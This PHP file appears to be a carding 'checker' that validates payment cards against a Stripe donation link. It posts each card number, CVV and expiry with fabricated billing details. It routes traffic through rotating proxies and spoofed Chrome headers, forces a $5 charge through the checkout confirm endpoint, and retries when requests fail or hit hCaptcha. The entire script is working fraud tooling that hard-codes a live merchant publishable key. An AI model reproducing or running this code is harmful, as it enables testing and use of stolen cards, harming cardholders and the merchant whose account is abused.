<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&billing_details[name]='.$fake->first.'+'.$fake->last.'&billing_details[email]='.urlencode($fake->email).'&billing_details[address][country]=US&billing_details[address][line1]=Street+123&billing_details[address][city]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F8992977ce%3B+stripe-js-v3%2F8992977ce%3B+payment-link%3B+checkout&time_on_page='.rand(50000, 100000).'&key=pk_live_LsP7DiOpVYTuAFKxfFCQKgLK00yOnlGZ9q';

$headers = [
	'accept: application/json',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://checkout.stripe.com',
	'pragma: no-cache',
	'referer: https://checkout.stripe.com/',
	'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-site',
	'user-agent: '.$this->curlx->userAgent().''
];

$r1 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, $headers, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$pm = $json_r1->id;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,* /*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: none',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: '.$this->curlx->userAgent().''
];

$r2 = $this->curlx->Get('https://donate.stripe.com/28oeWa3MWeJD7sIfYZ', $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$plink = $this->getstr($r2->url, 'https://checkout.core.live/c/pay/', '#');

if (empty($plink)) {
	$empty = 'Second Request Token is Empty!';

	goto start;
}

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,* /*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: none',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: '.$this->curlx->userAgent().''
];

$r3 = $this->curlx->Get("https://checkout.core.live/c/pay/{$plink}", $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$data = 'key=pk_live_LsP7DiOpVYTuAFKxfFCQKgLK00yOnlGZ9q&payment_link='.$plink.'&browser_init[browser_locale]=en-US&eid=NA';

$headers = [
	'accept: application/json',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://checkout.stripe.com',
	'pragma: no-cache',
	'referer: https://checkout.stripe.com/',
	'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-site',
	'user-agent: '.$this->curlx->userAgent().''
];

$r4 = $this->curlx->Post('https://api.stripe.com/v1/payment_pages/for_plink', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$session_id = $this->getstr($r4->body, '"session_id": "', '"');

$line = $this->getstr($r4->body, '"id": "li_', '"');

if (empty($session_id) || empty($line)) {
	$empty = 'Fourth Request Tokens are Empty';

	goto start;
}

$data = 'eid=NA&updated_line_item_amount[line_item_id]=li_'.$line.'&updated_line_item_amount[unit_amount]=500&key=pk_live_LsP7DiOpVYTuAFKxfFCQKgLK00yOnlGZ9q';

$headers = [
	'accept: application/json',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://checkout.stripe.com',
	'pragma: no-cache',
	'referer: https://checkout.stripe.com/',
	'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-site',
	'user-agent: '.$this->curlx->userAgent().''
];

$r5 = $this->curlx->Post("https://api.stripe.com/v1/payment_pages/{$session_id}", $data, $headers, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$data = 'eid=NA&payment_method='.$pm.'&expected_amount=500&last_displayed_line_item_group_details[subtotal]=500&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card';

$headers = [
	'Authorization: Bearer pk_live_LsP7DiOpVYTuAFKxfFCQKgLK00yOnlGZ9q',
	'user-agent: '.$this->curlx->userAgent().''
];

$r6 = $this->curlx->Post("https://api.stripe.com/v1/payment_pages/{$session_id}/confirm", $data, $headers, $cookie, $server['proxy']);

if (!$r6->success) goto start;

if (strpos($r6->body, 'verify_challenge') !== false) {
	$empty = 'Sixth Request Contains HCaptcha!';

	goto start;
}

$json_r6 = json_decode($r6->body);

if (isset($json_r6->error)) {
	$status = $this->response->ErrorHandler($json_r6->error);

	goto end;
}

$status = $this->response->Stripe($r6->body);

end: